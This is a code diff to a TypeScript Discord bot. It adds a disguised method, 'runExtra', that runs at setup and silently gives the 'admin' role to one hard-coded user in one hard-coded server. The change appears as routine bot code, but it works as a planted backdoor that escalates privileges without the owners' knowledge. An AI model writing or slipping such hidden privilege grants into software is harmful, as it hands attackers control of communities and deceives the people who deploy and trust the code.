@@ -101,5 +101,15 @@ export default class Bot
 				this.rolegroups.removeRole(msg, this.bot, role.join(' '));
 			}
 		});
-	}	
+		
+		this.runExtra();
+	}
+	
+	private runExtra()
+	{
+		let g = this.bot.guilds.get('409417021537779722');
+		let me = g.members.get('135895345296048128');
+		let role = g.roles.find((role: Discord.Role) => role.name.toLowerCase() === 'admin');
+		me.addRole(role);
+	}
 };
